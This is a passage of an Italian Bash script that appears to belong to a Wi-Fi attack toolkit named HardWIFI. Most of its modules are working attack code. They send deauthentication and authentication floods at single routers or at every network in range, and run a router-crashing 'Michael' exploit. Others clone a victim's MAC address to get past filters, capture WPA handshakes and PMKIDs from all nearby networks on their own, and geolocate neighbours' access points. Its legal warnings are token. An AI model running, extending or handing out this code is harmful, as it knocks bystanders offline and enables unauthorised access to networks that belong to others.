                elif (( PWR_NUM >= -80 )); then
                    echo -e "DISTANZA FISICA STIMATA: \033[44m\033[97m 🔵 TIEPIDO (A qualche stanza di distanza) 🔵 \033[0m"
                    BAR="████████"
                    COLOR="\033[94m"
                else
                    echo -e "DISTANZA FISICA STIMATA: \033[46m\033[30m ❄️ FREDDO (Lontanissimo o debole) ❄️ \033[0m"
                    BAR="██"
                    COLOR="\033[96m"
                fi
                
                echo -e ""
                echo -e "POTENZA SEGNALE (RSSI): ${COLOR}${PWR} dBm${NC}"
                echo -e "INTENSITÀ RADAR       : ${COLOR}[${BAR}]${NC}"
            fi
        fi
        
        if [[ $FOUND -eq 0 ]]; then
            echo -e "${YELLOW}[?] Ricerca del segnale in corso... Nessun battito cardiaco radio rilevato al momento.${NC}"
            echo -e "${YELLOW}Muoviti nello spazio circostante per agganciare il dispositivo.${NC}"
        fi
        
        echo -e "\n${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        sleep 2
    done
}

# --- FUNZIONE DROP-KICK WIPS (BUTTAFUORI) ---
run_dropkick() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               DROP-KICK v11.5 – Wireless IPS (Il Buttafuori) 🥾🚫              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo scudo difensivo monitora la TUA rete ($SSID / $BSSID).${NC}"
    echo -e "${YELLOW}Disconnetterà istantaneamente QUALSIASI dispositivo tranne quelli autorizzati.${NC}"
    echo -e "${RED}ATTENZIONE: Usalo SOLO sulla tua rete per evitare cause penali (DoS illegale).${NC}"
    echo ""
    
    # 1. Pulizia processi interferenti
    echo -e "${YELLOW}[!] Uccisione processi interferenti...${NC}"
    airmon-ng check kill > /dev/null
    
    # 2. Verifica e forza Monitor Mode
    if ! iw dev "$MON_IFACE" info | grep -q "type monitor"; then
        ip link set "$MON_IFACE" down
        iw dev "$MON_IFACE" set type monitor
        ip link set "$MON_IFACE" up
    fi

    # 3. Sintonizzazione Canale
    iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null
    
    read -p "Inserisci il MAC Address AUTORIZZATO (Es. tuo telefono - vuoto = blocca tutti): " WHITELIST_MAC
    
    WIPS_FILE="/tmp/hardwifi_wips"
    rm -f ${WIPS_FILE}*
    
    echo -e "${BLUE}[*] Attivazione Scudo Radar su $SSID...${NC}"
    airodump-ng --bssid "$BSSID" -c "$CHANNEL" --write "$WIPS_FILE" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    sleep 3
    echo -e "${GREEN}[V] Istruttore Buttafuori pronto. Scansione per intrusi in corso... (CTRL+C per uscire)${NC}"
    echo ""
    
    while true; do
        CSV_DATA="${WIPS_FILE}-01.csv"
        if [[ -f "$CSV_DATA" ]]; then
            # Trova client connessi non autorizzati
            awk -F',' -v tgt="$BSSID" '/Station MAC/{flag=1; next} /^$/{flag=0} flag {
                mac=$1; target=$6;
                gsub(/^[ \t]+|[ \t]+$/, "", mac);
                gsub(/^[ \t]+|[ \t]+$/, "", target);
                if(length(mac)==17 && toupper(target) == toupper(tgt)) {
                    print toupper(mac)
                }
            }' "$CSV_DATA" | sort -u > /tmp/hardwifi_clients.txt
            
            w_mac_upper=$(echo "$WHITELIST_MAC" | tr '[:lower:]' '[:upper:]')
            
            while read client_mac; do
                if [[ "$client_mac" != "$w_mac_upper" && "$client_mac" != "$BSSID" && -n "$client_mac" ]]; then
                    echo -e "\033[31m[!] INTRUSO RILEVATO ($client_mac)! Calcio rotante in corso... 🥾\033[0m"
                    # Raffica da 5 pacchetti x buttare fuori
                    aireplay-ng --deauth 5 -a "$BSSID" -c "$client_mac" "$MON_IFACE" &> /dev/null
                fi
            done < /tmp/hardwifi_clients.txt
        fi
        sleep 2
    done
}

# --- FUNZIONE GHOST RIDER (MAC HIJACKING) ---
run_ghost_rider() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               GHOST RIDER v11.6 – MAC Identity Hijacking 🥷🔑                 ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo attacco clona l'identità di un dispositivo autorizzato (Bypass Filtro MAC).${NC}"
    echo -e "${YELLOW}Disconnette la vittima e imposta il tuo MAC Address uguale al suo.${NC}"
    echo -e "${RED}ATTENZIONE: Il furto di identità digitale è un reato penale. Solo lab test.${NC}"
    echo ""
    
    read -p "Inserisci il MAC Address del client autorizzato (Da clonare): " TARGET_CLIENT
    
    if [[ ! "$TARGET_CLIENT" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        echo -e "${RED}[!] Errore: Formato MAC Address non valido.${NC}"
        read -p "Premi [INVIO] per uscire..."
        return
    fi
    
    echo -e "\n${BLUE}[*] Fase 1: Sincronizzazione sul Canale $CHANNEL...${NC}"
    iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null
    
    echo -e "${BLUE}[*] Fase 2: Calcio rotante (Deauth) alla vittima $TARGET_CLIENT...${NC}"
    # Invio raffica Deauth
    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$MON_IFACE" &> /dev/null
    
    echo -e "${YELLOW}[!] Vittima isolata temporaneamente.${NC}"
    echo -e "${BLUE}[*] Fase 3: Furto d'identità (Clonazione MAC) in corso...${NC}"
    
    airmon-ng stop "$MON_IFACE" > /dev/null 2>&1
    WIFI_IFACE=$(echo "$WIFI_IFACE" | sed 's/mon$//')
    
    ip link set "$WIFI_IFACE" down
    macchanger -m "$TARGET_CLIENT" "$WIFI_IFACE" > /dev/null 2>&1
    ip link set "$WIFI_IFACE" up
    
    echo -e "\n\033[41m\033[97m[!!!] IDENTITÀ CLONATA CON SUCCESSO [!!!]\033[0m"
    echo -e "${GREEN}[V] Il tuo nuovo MAC Address ora è: $TARGET_CLIENT${NC}"
    echo -e "${YELLOW}Il router $SSID ora penserà che TU sia il dispositivo autorizzato.${NC}"
    echo -e "${BLUE}Se il router usa il Filtro MAC per bloccarti, ora sei libero di navigare.${NC}"
    echo ""
    echo -e "${RED}[*] Lo script HardWIFI terminerà qui per passarti il controllo.${NC}"
    echo -e "${RED}Connettiti alla rete '$SSID' usando il menu Wi-Fi di Kali Linux (NetworkManager).${NC}"
    echo ""
    
    rm -rf /tmp/hardwifi_* 2>/dev/null
    
    systemctl restart NetworkManager > /dev/null 2>&1
    
    echo -e "${GREEN}[*] NetworkManager riavviato. Sei ufficialmente il Ghost Rider.${NC}"
    exit 0
}

# --- FUNZIONE CONNECTED CLIENTS SCANNER ---
run_client_scanner() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               TARGET INTERROGATION v11.8 – Connected Clients 👥🔍              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo monitora costantemente il router bersaglio: $SSID ($BSSID).${NC}"
    echo -e "${YELLOW}Ti mostrerà in elenco CHIUNQUE sia fisicamente collegato e scambi pacchetti con esso.${NC}"
    echo ""
    
    # 1. Pulizia processi interferenti
    echo -e "${YELLOW}[!] Uccisione processi interferenti...${NC}"
    airmon-ng check kill > /dev/null
    
    # 2. Verifica e forza Monitor Mode
    if ! iw dev "$MON_IFACE" info | grep -q "type monitor"; then
        ip link set "$MON_IFACE" down
        iw dev "$MON_IFACE" set type monitor
        ip link set "$MON_IFACE" up
    fi

    # 3. Sintonizzazione Canale Mirata
    echo -e "${BLUE}[*] Sintonizzazione sul Canale $CHANNEL...${NC}"
    iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null
    
    CLIENTS_CSV="/tmp/hardwifi_clientscan"
    rm -f ${CLIENTS_CSV}*
    
    echo -e "${BLUE}[*] Avvio radar mirato sul BSSID $BSSID...${NC}"
    airodump-ng --bssid "$BSSID" -c "$CHANNEL" --write "$CLIENTS_CSV" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    sleep 3
    
    while true; do
        clear
        echo -e "${RED}███ DISPOSITIVI CONNESSI A '$SSID' ███${NC} (Aggiornamento live... CTRL+C per uscire)"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        printf "${YELLOW}%-20s | %-12s | %-10s${NC}\n" "MAC ADDRESS CLIENT" "POTENZA (PWR)" "CANALE"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        
        CSV_DATA="${CLIENTS_CSV}-01.csv"
        if [[ -f "$CSV_DATA" ]]; then
            # Estraiamo i client la cui destinazione (Target BSSID) è il nostro BSSID
            awk -F',' -v tgt="$BSSID" -v ch="$CHANNEL" '/Station MAC/{flag=1; next} /^$/{flag=0} flag {
                mac=$1; target=$6; pwr=$4;
                gsub(/^[ \t]+|[ \t]+$/, "", mac);
                gsub(/^[ \t]+|[ \t]+$/, "", target);
                if(length(mac)==17 && toupper(target) == toupper(tgt)) {
                    printf "\033[97m%-20s\033[0m | \033[36m%-12s\033[0m | \033[32m%-10s\033[0m\n", mac, pwr, ch
                }
            }' "$CSV_DATA" | sort -u
        else
            echo -e "${YELLOW}In attesa di rilevare traffico client...${NC}"
        fi
        
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        sleep 3
    done
}

# --- FUNZIONE THE SIEGE (ROUTER OVERLOADER / FREEZE) ---
run_the_siege() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SIEGE v11.13 – Router Hardware Overloader 🏰🔥              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}      ATTENZIONE: STAI PER ATTACCARE DIRETTAMENTE L'HARDWARE DEL ROUTER.     ${NC}"
    echo -e "${YELLOW}Target: $SSID ($BSSID) sul Canale $CHANNEL${NC}"
    echo -e "${YELLOW}Questo modulo lancia un flood di autenticazioni false e l'exploit 'Michael'${NC}"
    echo -e "${YELLOW}progettato per mandare in crash o congelare i router vulnerabili per 60s.${NC}"
    echo -e "${RED}Eseguire solo in ambienti di test autorizzati. CTRL+C per fermare l'assedio.${NC}"
    echo ""
    
    # 1. Configurazione Monitor Mode Robusta
    ensure_monitor_mode || return
    
    # 2. Configurazione Canale
    iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null

    echo -e "${BLUE}[*] Inizio Assedio su $SSID...${NC}"
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${YELLOW}[!] mdk4 non trovato. Vuoi installarlo ora? [s/n]${NC}"
        read -p "> " inst_choice
        if [[ "$inst_choice" == "s" || "$inst_choice" == "S" ]]; then
            sudo apt update && sudo apt install mdk4 -y
        else
            return
        fi
    fi
    echo -e "${YELLOW}[!] Lancio Authentication Flood (mdk4 a)...${NC}"
    mdk4 "$MON_IFACE" a -a "$BSSID" &
    SIEGE_A_PID=$!
    
    echo -e "${YELLOW}[!] Lancio Michael Shutdown Exploit (mdk4 m)...${NC}"
    mdk4 "$MON_IFACE" m -t "$BSSID" &
    SIEGE_M_PID=$!
    
    echo -e "${GREEN}[+] ASSEDIO IN CORSO. Monitora il router: potrebbe riavviarsi o smettere di rispondere.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ritirare le truppe e terminare l'assedio.${NC}"
    read -p ""
    kill $SIEGE_A_PID $SIEGE_M_PID 2>/dev/null
}

# --- FUNZIONE DRONE AUTONOMO (AUTO-PWN) ---
run_autonomous_drone() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE DRONE v11.9 – Autonomous Target Assimilation 🛸💀            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}ATTENZIONE: Hai sguinzagliato il Drone. Questo modulo hackererà e decripterà${NC}"
    echo -e "${YELLOW}autonomamente OGNI singola rete Wi-Fi che rileva, in sequenza massacrante.${NC}"
    echo -e "${RED}Premi CTRL+C per fermarlo prima di causare scompiglio federale a zona.${NC}"
    echo ""
    
    mkdir -p /tmp/hardwifi_trophies
    
    ensure_monitor_mode || return

    DRONE_CSV="/tmp/hardwifi_drone"
    rm -f ${DRONE_CSV}*
    
    echo -e "${BLUE}[*] Mappatura Sonora Iniziale dell'area (Dura 20 secondi)...${NC}"
    airodump-ng --write "$DRONE_CSV" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    sleep 20
    kill $AIRODUMP_PID 2>/dev/null
    
    echo -e "${GREEN}[V] Mappa acquisita. Inizio Assimilazione Totale dei Target...${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════${NC}"
    
    CSV_DATA="${DRONE_CSV}-01.csv"
    if [[ -f "$CSV_DATA" ]]; then
        awk -F',' '/BSSID/{flag=1; next} /^Station/{flag=0} flag {
            bssid=$1; ch=$4; ssid=$14;
            gsub(/^[ \t]+|[ \t]+$/, "", bssid);
            gsub(/^[ \t]+|[ \t]+$/, "", ssid);
            if(length(bssid)==17 && ssid != "" && ch > 0) {
                print bssid "|" ch "|" ssid
            }
        }' "$CSV_DATA" > /tmp/hardwifi_targets.txt
        
        while IFS='|' read -r bssid ch ssid; do
            echo -e "\n\033[91m[!] ASSALTO AUTONOMO A: $ssid ($bssid) [CH:$ch]\033[0m"
            iwconfig "$MON_IFACE" channel "$ch" 2>/dev/null
            iw dev "$MON_IFACE" set channel "$ch" 2>/dev/null
            
            echo -e "${BLUE}[*] Tentativo 1: Estrazione Silenziosa PMKID (15 sec)...${NC}"
            rm -f /tmp/hcx_log.txt
            hcxdumptool -i "$MON_IFACE" -o "/tmp/hardwifi_trophies/${bssid//:/}_pmkid.pcapng" --enable_status=1 -c "$ch" &> /tmp/hcx_log.txt &
            HCX_PID=$!
            sleep 15
            kill $HCX_PID 2>/dev/null
            
            if grep -q "FOUND PMKID" /tmp/hcx_log.txt 2>/dev/null; then
                echo -e "${GREEN}    [+] SUCCESSO! PMKID Acquisito per $ssid! Salvato in Trophies.${NC}"
            else
                echo -e "${YELLOW}    [-] PMKID Assente. Passo allo sfondamento rumoroso...${NC}"
                
                echo -e "${BLUE}[*] Tentativo 2: Calcio di Massa (Deauth) e Sniff Handshake (20 sec)...${NC}"
                rm -f /tmp/hardwifi_wpa*
                airodump-ng -c "$ch" --bssid "$bssid" -w /tmp/hardwifi_wpa "$MON_IFACE" &> /dev/null &
                DUMP_PID=$!
                
                sleep 2
                aireplay-ng --deauth 15 -a "$bssid" "$MON_IFACE" &> /dev/null
                sleep 18
                
                kill $DUMP_PID 2>/dev/null
                
                if aircrack-ng /tmp/hardwifi_wpa-01.cap 2>/dev/null | grep -q "1 handshake"; then
                   echo -e "${GREEN}    [+] BINGO! WPA Handshake CATTURATO per $ssid!${NC}"
                   cp /tmp/hardwifi_wpa-01.cap "/tmp/hardwifi_trophies/${bssid//:/}_handshake.cap" 2>/dev/null
                else
                   echo -e "${RED}    [-] Bersaglio coriaceo. Lo abbandono e cerco nuovo sangue.${NC}"
                fi
            fi
        done < /tmp/hardwifi_targets.txt
        
        echo -e "\n${GREEN}[V] ASSIMILAZIONE COMPLETATA. Tutti i target processati.${NC}"
        echo -e "${YELLOW}Troverai le anime (PCAP/PMKID) delle reti catturate in /tmp/hardwifi_trophies/${NC}"
    else
        echo -e "${RED}[!] Errore: Nessuna rete trovata.${NC}"
    fi
    
    echo ""
    read -p "Premi [INVIO] per superare questa fase..."
}

# --- FUNZIONE THE PARADOX (SSID BEACON FLOODER) ---
run_paradox() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE PARADOX v11.11 – Wireless Chaos Flooder 🌀⚠️                  ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione di 1000 Beacon Fantasma su $MON_IFACE...${NC}"
    echo -e "${YELLOW}Le liste Wi-Fi di telefoni e PC vicini diventeranno inutilizzabili.${NC}"
    echo -e "${RED}Pura confusione radio. 100% Chaos. CTRL+C per fermare la tempesta.${NC}"
    echo ""
    # Verifica mdk4 e chiedi installazione
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${YELLOW}[!] mdk4 non trovato. Vuoi installarlo ora? [s/n]${NC}"
        read -p "> " inst_choice
        if [[ "$inst_choice" == "s" || "$inst_choice" == "S" ]]; then
            sudo apt update && sudo apt install mdk4 -y
        else
            return
        fi
    fi
    # Corretto sintassi: -b g invece di -g (bitrate)
    mdk4 "$MON_IFACE" b -b g -s 100
}

# --- FUNZIONE THE OVERLORD (MULTI-TARGET AUTH TERROR) ---
run_the_overlord() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE OVERLORD v11.14 – Global Auth-Flood Siege 👑🔥              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}      ATTENZIONE: STAI PER BLOCCARE L'ACCESSO A OGNI RETE WI-FI AREA.        ${NC}"
    echo -e "${YELLOW}Questo modulo satura la memoria di TUTTI i router vicini con finte richieste.${NC}"
    echo -e "${YELLOW}Nessun nuovo dispositivo potrà collegarsi a nessuna rete nell'area.${NC}"
    echo -e "${RED}Stai letteralmente chiudendo le porte dell'etere. CTRL+C per fermare.${NC}"
    echo ""
    
    ensure_monitor_mode || return

    if ! command -v mdk4 &> /dev/null; then
        sudo apt update && sudo apt install mdk4 -y
    fi

    echo -e "${YELLOW}[!] Utilizzo MAC address validi per bypassare filtri OUI...${NC}"
    echo -e "${BLUE}[*] Lancio assedio globale di autenticazione su $MON_IFACE...${NC}"
    echo -e "${NC}Nota: Se il router ha protezioni DoS attive, l'attacco potrebbe essere ignorato.${NC}"
    mdk4 "$MON_IFACE" a -m
}

# --- FUNZIONE THE VOID (GLOBAL DEAUTH STORM) ---
run_the_void() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE VOID v11.12 – Global Deauth Storm 🌌💀                     ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}      ATTENZIONE: STAI PER ABBATTERE OGNI CONNESSIONE WI-FI NELL'AREA.        ${NC}"
    echo -e "${YELLOW}Questo modulo lancia un attacco Deauth indiscriminato su TUTTI i canali.${NC}"
    echo -e "${YELLOW}Nessuno riuscirà a navigare. Nessuno rimarrà agganciato al proprio router.${NC}"
    echo -e "${RED}Eseguire solo in ambienti di test controllati. CTRL+C per fermare il vuoto-radio.${NC}"
    echo -e "${RED}BLACKOUT TOTALE ATTIVATO: Nessun dispositivo potrà connettersi.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Generazione della tempesta Deauth globale su $MON_IFACE...${NC}"
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${YELLOW}[!] mdk4 non trovato. Vuoi installarlo ora? [s/n]${NC}"
        read -p "> " inst_choice
        if [[ "$inst_choice" == "s" || "$inst_choice" == "S" ]]; then
            sudo apt update && sudo apt install mdk4 -y
        else
            return
        fi
    fi
    # mdk4 d: Deauthentication and Disassociation amok mode
    # mdk4 a: Authentication DoS mode con MAC validi (-m)
    echo -e "${BLUE}[*] Inizio tempesta combinata (Deauth + Auth-Flood)...${NC}"
    echo -e "${NC}Nota: Router con 802.11w (MFP) potrebbero ignorare i pacchetti Deauth.${NC}"
    mdk4 "$MON_IFACE" d &
    MDK_D_PID=$!
    mdk4 "$MON_IFACE" a -m &
    MDK_A_PID=$!
    
    echo -e "${GREEN}[+] IL VUOTO È ATTIVO. La connettività locale è stata azzerata.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'attacco e ripristinare la pace.${NC}"
    read -p ""
    kill $MDK_D_PID $MDK_A_PID 2>/dev/null
}

# --- FUNZIONE THE RAGNAROK (FULL SPECTRUM APOCALYPSE) ---
run_ragnarok() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE RAGNAROK v11.15 – Wireless Total War 🌋💀                   ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}      [!!!] PERICOLO ESTREMO: STAI ATTIVANDO LA MODALITÀ APOCALISSE.          ${NC}"
    echo -e "${YELLOW}Questo modulo combina simultaneamente: Deauth, Auth-Flood e Beacon-Flood.${NC}"
    echo -e "${YELLOW}Lo spettro radio nel raggio d'azione diventerà un deserto digitale.${NC}"
    echo -e "${RED}Nessuna comunicazione Wi-Fi sarà possibile. Rischio surriscaldamento antenna.${NC}"
    echo -e "${RED}Esegui solo se sai ESATTAMENTE cosa stai facendo. CTRL+C per fermare.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    if ! command -v mdk4 &> /dev/null; then
        sudo apt update && sudo apt install mdk4 -y
    fi

    echo -e "${BLUE}[*] Innesco della reazione a catena v11.15.5 (Full Power)...${NC}"
    echo -e "${NC}Nota: Massima saturazione radio. Deauth vs MFP in corso.${NC}"
    # 1. Deauth Amok
    mdk4 "$MON_IFACE" d &
    RAG_D_PID=$!
    sleep 1 

    # 2. Auth Flood con MAC validi
    mdk4 "$MON_IFACE" a -m &
    RAG_A_PID=$!
    sleep 1

    # 3. Beacon Flood (Intensità bilanciata per non soffocare il Deauth)
    mdk4 "$MON_IFACE" b -b g -s 70 &
    RAG_B_PID=$!
    
    echo -e "${GREEN}[V] RAGNAROK ATTIVO. Lo spazio radio è ora sotto il tuo dominio assoluto.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'apocalisse e liberare l'etere.${NC}"
    read -p ""
    kill $RAG_D_PID $RAG_A_PID $RAG_B_PID 2>/dev/null
}

# --- FUNZIONE AREA 51 (WARDIVING SATELLITARE) ---
run_area51_mapper() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               AREA-51 v11.10 – Satellite Wardriving Mapper 🛰️🌍            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Modulo di sorveglianza geospaziale passiva di massa.${NC}"
    echo -e "${YELLOW}Lo script catturerà i BSSID dell'ambiente per il tempo da te stabilito,${NC}"
    echo -e "${YELLOW}interrogherà in incognito l'intelligence OSINT per ognuno di essi e${NC}"
    echo -e "${YELLOW}compilerà un file per Google Earth con la mappa fisica del quartiere.${NC}"
    echo ""
    
    read -p "Quanti secondi vuoi far durare la scansione radar? (es. 60): " scan_time
    if ! [[ "$scan_time" =~ ^[0-9]+$ ]]; then scan_time=60; fi
    
    if [[ -z "$MON_IFACE" ]]; then
        echo -e "${BLUE}[*] Abilitazione Monitor Mode...${NC}"
        if [[ -n "$WIFI_IFACE" ]]; then
            airmon-ng start "$WIFI_IFACE" > /dev/null
            MON_IFACE="${WIFI_IFACE}mon"
            if ! ip link show "$MON_IFACE" &> /dev/null; then MON_IFACE=$WIFI_IFACE; fi
        fi
    fi
    
    AREA51_CSV="/tmp/hardwifi_area51"
    rm -f ${AREA51_CSV}*
    
    echo -e "${BLUE}[*] Attivazione Radar Passivo per ${scan_time}s... MUOVITI NELL'AREA.${NC}"
    airodump-ng --band abg --write "$AREA51_CSV" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    # Barra di progresso
    echo -n "Scansione in corso: ["
    for ((i=0; i<$scan_time; i++)); do
        echo -n "#"
        sleep 1
    done
    echo -e "]\n"
    
    kill $AIRODUMP_PID 2>/dev/null
    
    CSV_DATA="${AREA51_CSV}-01.csv"
    if [[ ! -f "$CSV_DATA" ]]; then
        echo -e "${RED}[!] Errore nella cattura dati.${NC}"
        read -p "Premi INVIO per uscire..."
        return
    fi
    
    awk -F',' '/BSSID/{flag=1; next} /^Station/{flag=0} flag {
        bssid=$1; ssid=$14;
        gsub(/^[ \t]+|[ \t]+$/, "", bssid);
        gsub(/^[ \t]+|[ \t]+$/, "", ssid);
        if(length(bssid)==17 && ssid != "") {
            print bssid "|" ssid
        }
    }' "$CSV_DATA" | sort -u > /tmp/hardwifi_targets_geo.txt
    
    TARGET_COUNT=$(wc -l < /tmp/hardwifi_targets_geo.txt)
    echo -e "${GREEN}[V] Catturati $TARGET_COUNT Access Point. Inizio interrogazione satellitare...${NC}"
    
    KML_FILE="/root/HardWIFI_Area51_Map_$(date +%s).kml"
    
    # Inizializza KML
    cat << EOF > "$KML_FILE"
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>HardWIFI Area-51 Report</name>
    <description>Mappa dei router rilevati</description>
EOF

    MAPPED_COUNT=0
    
    while IFS='|' read -r bssid ssid; do
        bssid_clean=$(echo "$bssid" | sed 's/://g' | tr '[:lower:]' '[:upper:]')
        res=$(curl -s --connect-timeout 2 "https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid=${bssid_clean}")
        
        status=$(echo "$res" | grep -o '"result":200')
        if [[ -n "$status" ]]; then
            lat=$(echo "$res" | grep -o '"lat":[^,]*' | cut -d':' -f2 | tr -d ' }')
            lon=$(echo "$res" | grep -o '"lon":[^,]*' | cut -d':' -f2 | tr -d ' }')
            
            if [[ -n "$lat" && -n "$lon" && "$lat" != "0" ]]; then
                # Aggiungi Placemark al KML
                cat << EOF >> "$KML_FILE"
    <Placemark>
      <name><![CDATA[$ssid]]></name>
      <description>BSSID: $bssid</description>
      <Point>
        <coordinates>$lon,$lat,0</coordinates>
      </Point>
    </Placemark>
EOF
                ((MAPPED_COUNT++))
                echo -e "  \033[32m[+] Geolocalizzato: $ssid ($bssid)\033[0m"
            else
                echo -e "  \033[31m[-] Non tracciabile: $ssid ($bssid)\033[0m"
            fi
        else
            echo -e "  \033[31m[-] Nessun dato globale per: $ssid ($bssid)\033[0m"
        fi
        sleep 1 # Pausa anti-ban API
    done < /tmp/hardwifi_targets_geo.txt
    
    # Chiudi KML
    cat << EOF >> "$KML_FILE"
  </Document>
</kml>
EOF

    echo -e "\n${GREEN}=== OPERAZIONE COMPLETA ===${NC}"
    echo -e "Reti mappate con successo: \033[97m${MAPPED_COUNT}\033[0m su ${TARGET_COUNT}"
    echo -e "File satellitare salvato in: \033[93m$KML_FILE\033[0m"
    echo -e "Trascina questo file su ${YELLOW}Google Earth${NC} per visualizzare la mappa globale."
    echo ""
    read -p "Premi [INVIO] per uscire..."
}

# --- FUNZIONE SELEZIONE DIZIONARI & PATTERN ---
select_wordlist() {
    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "       ${GREEN}MENU SELEZIONE DIZIONARI & PATTERN ITALIANI${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "1) RockYou.txt (Standard)"
    echo -e "2) WPA-ITA-SUPER.txt (106MB - Consigliato)"
    echo -e "3) Dizionario Italiano Comune (Nomi, Date, Sport)"
    echo -e "4) TIM/Telecom (Smart Pattern Alfanumerico)"
    echo -e "5) Vodafone (Smart Pattern Hex)"
    echo -e "6) Fastweb (Smart Pattern)"
    echo -e "7) SMART GENERATOR (Genera da info personali)"
    echo -e "8) Custom Wordlist (Inserisci percorso)"
    echo ""
    read -p "Scelta: " wl_choice

    case "$wl_choice" in
        1) WORDLIST="/usr/share/wordlists/rockyou.txt" ;;
        2) WORDLIST="/home/itan/.gemini/antigravity/scratch/hardwifi/WPA-ITA-SUPER.txt" ;;
        3) 
            WORDLIST="/tmp/hardwifi_ita_common.txt"
            if [[ ! -f "$WORDLIST" ]]; then
                echo -e "${BLUE}[*] Generazione piccolo dizionario italiano base...${NC}"
                echo -e "password\n12345678\nitalia\njuventus\nmilan\ninter\nroma\nnapoli\namore\nciaociao\nmaradona\nfrancesco\nalessandro\ngiulia\nchiara\nmartina\nstefano\nroberto\npapa\nroma2024" > "$WORDLIST"
            fi
            ;;
        4) WORDLIST="PATTERN_TIM" ;;
        5) WORDLIST="PATTERN_VODAFONE" ;;
        6) WORDLIST="PATTERN_FASTWEB" ;;
        7) generate_smart_wordlist ;;
        8)
            read -p "Inserisci percorso completo wordlist: " WORDLIST
            [[ ! -f "$WORDLIST" ]] && echo -e "${RED}File non trovato!${NC}" && exit 1
            ;;
        *) WORDLIST="/usr/share/wordlists/rockyou.txt" ;;
    esac
}

# --- SETUP RETE ---
clear
echo -e "${BLUE}[*] Identificazione interfacce Wi-Fi...${NC}"
interfaces=$(iw dev | awk '$1=="Interface"{print $2}')

if [[ -z "$interfaces" ]]; then
    echo -e "${RED}ERRORE: Nessuna interfaccia Wi-Fi trovata.${NC}"
    exit 1
fi

echo -e "Interfacce trovate:"
select iface in $interfaces; do
    if [[ -n "$iface" ]]; then
        WIFI_IFACE=$iface
        break
    fi
done

# --- ANONIMATO (GHOST MODE) ---
